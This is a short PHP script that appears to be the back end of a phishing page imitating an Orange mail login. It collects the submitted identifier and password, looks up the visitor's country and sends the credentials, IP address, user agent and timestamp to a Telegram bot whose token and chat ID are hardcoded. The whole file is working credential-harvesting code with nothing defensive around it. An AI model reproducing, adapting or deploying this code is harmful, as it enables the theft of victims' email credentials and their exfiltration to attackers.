
<?php

$data['identif'] = $_POST['iden'];
$data['password'] = $_POST['pass'];

function get_user_country() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". $_SERVER['REMOTE_ADDR'] .""));
    if ($details && $details->geoplugin_countryName != null) {
        $countryname = $details->geoplugin_countryName;
    }
    return $countryname;
 }

$svr_os=strtolower(reset(explode(' ',php_uname('s'))));
$isLinux=$svr_os==='linux';
$isWindows=$svr_os==='windows';
$isMacOS=$svr_os==='Mac OS';

if(isset($_POST['pass']))
    {
      
        $apiToken = "6907472569:AAHYn00brBoiiPd4lqHV5F5yf4m4fYBCmJo";
        $datas = [
            'chat_id' => '-1002010485177', 
            'text' => $subject = '****ORANGE Mail INFO****' . "\r\n" . 'IP_User : ' . getenv("REMOTE_ADDR") . "\r\n" . 'Data_Time : ' . $date = gmdate("H:i:s | d/m/Y") . "\r\n" . 
            'Identifiant : ' . $_POST['iden'] . "\r\n" . 'Password : ' . $_POST['pass'] . "\r\n" . 'Country : ' . get_user_country() . "\r\n" . 'User_Agent : ' . $user_agent = $_SERVER['HTTP_USER_AGENT'] . "\r\n" . 'OS : ' . $svr_os

        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($datas)); 


    }
?>